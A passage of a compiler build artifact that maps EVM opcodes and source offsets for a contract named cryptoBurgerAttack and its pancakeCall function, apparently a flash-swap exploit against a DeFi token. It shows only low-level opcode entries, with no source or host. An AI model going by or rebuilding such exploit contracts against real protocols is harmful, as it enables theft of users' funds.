      "path": "0"
    },
    "2315": {
      "op": "MSTORE"
    },
    "2316": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2318": {
      "op": "DUP1"
    },
    "2319": {
      "op": "MLOAD"
    },
    "2320": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2322": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "2325": {
      "op": "DUP4"
    },
    "2326": {
      "op": "CODECOPY"
    },
    "2327": {
      "op": "DUP2"
    },
    "2328": {
      "op": "MLOAD"
    },
    "2329": {
      "op": "SWAP2"
    },
    "2330": {
      "op": "MSTORE"
    },
    "2331": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2332": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2334": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "2336": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "2338": {
      "op": "SHL"
    },
    "2339": {
      "op": "SUB"
    },
    "2340": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4299
      ],
      "op": "AND",
      "path": "0"
    },
    "2341": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4299
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2342": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4309
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "2347": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4309
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2348": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "2350": {
      "op": "ADD"
    },
    "2351": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "2353": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2355": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2356": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2357": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2358": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "SUB",
      "path": "0"
    },
    "2359": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2360": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "DUP7",
      "path": "0"
    },
    "2361": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "GAS",
      "path": "0"
    },
    "2362": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "2363": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2364": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2365": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2366": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x94B"
    },
    "2369": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2370": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2371": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2373": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2374": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "2375": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2376": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2378": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "REVERT",
      "path": "0"
    },
    "2379": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2380": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "POP",
      "path": "0"
    },
    "2381": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "POP",
      "path": "0"
    },
    "2382": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "POP",
      "path": "0"
    },
    "2383": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "POP",
      "path": "0"
    },
    "2384": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2386": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2387": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2388": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2390": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "NOT",
      "path": "0"
    },
    "2391": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2393": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2394": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "ADD",
      "path": "0"
    },
    "2395": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "AND",
      "path": "0"
    },
    "2396": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2397": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "ADD",
      "path": "0"
    },
    "2398": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2399": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2401": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2402": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "POP",
      "path": "0"
    },
    "2403": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2404": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "ADD",
      "path": "0"
    },
    "2405": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2406": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x96F"
    },
    "2409": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2410": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2411": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "2414": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        4285,
        4324
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2415": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4285,
        4324
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2416": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2418": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2419": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x97C"
    },
    "2422": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2423": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2424": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DE5"
    },
    "2427": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        4228,
        4334
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2428": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2429": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2431": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2432": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2433": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2434": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "SUB",
      "path": "0"
    },
    "2435": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2436": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4228,
        4334
      ],
      "op": "LOG1",
      "path": "0"
    },
    "2437": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4345,
        4409
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 18,
      "value": "0x9B8"
    },
    "2440": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2442": {
      "op": "DUP1"
    },
    "2443": {
      "op": "MLOAD"
    },
    "2444": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2446": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "2449": {
      "op": "DUP4"
    },
    "2450": {
      "op": "CODECOPY"
    },
    "2451": {
      "op": "DUP2"
    },
    "2452": {
      "op": "MLOAD"
    },
    "2453": {
      "op": "SWAP2"
    },
    "2454": {
      "op": "MSTORE"
    },
    "2455": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2457": {
      "op": "DUP1"
    },
    "2458": {
      "op": "MLOAD"
    },
    "2459": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2461": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "2464": {
      "op": "DUP4"
    },
    "2465": {
      "op": "CODECOPY"
    },
    "2466": {
      "op": "DUP2"
    },
    "2467": {
      "op": "MLOAD"
    },
    "2468": {
      "op": "SWAP2"
    },
    "2469": {
      "op": "MSTORE"
    },
    "2470": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4366,
        4378
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2471": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4379,
        4380
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2473": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4366,
        4381
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2474": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4366,
        4381
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2475": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4366,
        4381
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2476": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4366,
        4381
      ],
      "op": "LT",
      "path": "0"
    },
    "2477": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4366,
        4381
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "2480": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4366,
        4381
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2481": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4366,
        4381
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "2484": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4366,
        4381
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "2487": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        4366,
        4381
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2488": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4345,
        4409
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2489": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 19,
      "value": "0x40"
    },
    "2491": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2492": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "2497": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "2499": {
      "op": "SHL"
    },
    "2500": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2501": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2502": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2504": {
      "op": "DUP1"
    },
    "2505": {
      "op": "MLOAD"
    },
    "2506": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2508": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "2511": {
      "op": "DUP4"
    },
    "2512": {
      "op": "CODECOPY"
    },
    "2513": {
      "op": "DUP2"
    },
    "2514": {
      "op": "MLOAD"
    },
    "2515": {
      "op": "SWAP2"
    },
    "2516": {
      "op": "MSTORE"
    },
    "2517": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2518": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4484
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "2523": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4484
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2524": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x9EB"
    },
    "2527": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2528": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4498,
        4513
      ],
      "op": "DUP7",
      "path": "0"
    },
    "2529": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4498,
        4513
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2530": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4527,
        4531
      ],
      "op": "DUP7",
      "path": "0"
    },
    "2531": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4527,
        4531
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2532": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "2534": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "ADD",
      "path": "0"
    },
    "2535": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "2538": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        4434,
        4541
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2539": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2540": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2542": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2544": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2545": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2546": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "DUP4",
      "path": "0"
    },
    "2547": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "SUB",
      "path": "0"
    },
    "2548": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2549": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "DUP7",
      "path": "0"
    },
    "2550": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "GAS",
      "path": "0"
    },
    "2551": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "2552": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2553": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2554": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "2555": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xA08"
    },
    "2558": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2559": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2560": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2562": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "DUP1",
      "path": "0"
    },
    "2563": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "2564": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2565": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2567": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "REVERT",
      "path": "0"
    },
    "2568": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2569": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "POP",
      "path": "0"
    },
    "2570": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "POP",
      "path": "0"
    },
    "2571": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "POP",
      "path": "0"
    },
    "2572": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "POP",
      "path": "0"
    },
    "2573": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2575": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2576": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2577": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2579": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2580": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "2581": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "2583": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "2584": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2585": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2586": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "ADD",
      "path": "0"
    },
    "2587": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "2589": {
      "op": "NOT"
    },
    "2590": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "AND",
      "path": "0"
    },
    "2591": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "DUP3",
      "path": "0"
    },
    "2592": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "ADD",
      "path": "0"
    },
    "2593": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "2595": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "2596": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xA30"
    },
    "2599": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "2600": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2601": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2602": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "ADD",
      "path": "0"
    },
    "2603": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2604": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "2607": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        4434,
        4541
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2608": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4434,
        4541
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2609": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4419,
        4541
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "2610": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4419,
        4541
      ],
      "op": "POP",
      "path": "0"
    },
    "2611": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "2613": {
      "op": "DUP1"
    },
    "2614": {
      "op": "MLOAD"
    },
    "2615": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "2617": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "2620": {
      "op": "DUP4"
    },
    "2621": {
      "op": "CODECOPY"
    },
    "2622": {
      "op": "DUP2"
    },
    "2623": {
      "op": "MLOAD"
    },
    "2624": {
      "op": "SWAP2"
    },
    "2625": {
      "op": "MSTORE"
    },
    "2626": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4661
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 20
    },
    "2627": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4662,
        4663
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "2629": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2630": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "2631": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "DUP2",
      "path": "0"
    },
    "2632": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "LT",
      "path": "0"
    },
    "2633": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xA54"
    },
    "2636": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "2637": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xA54"
    },
    "2640": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "2643": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        4649,
        4664
      ],
      "op": "JUMP",
      "path": "0"
    },
    "2644": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
        4664
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "2645": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        4649,
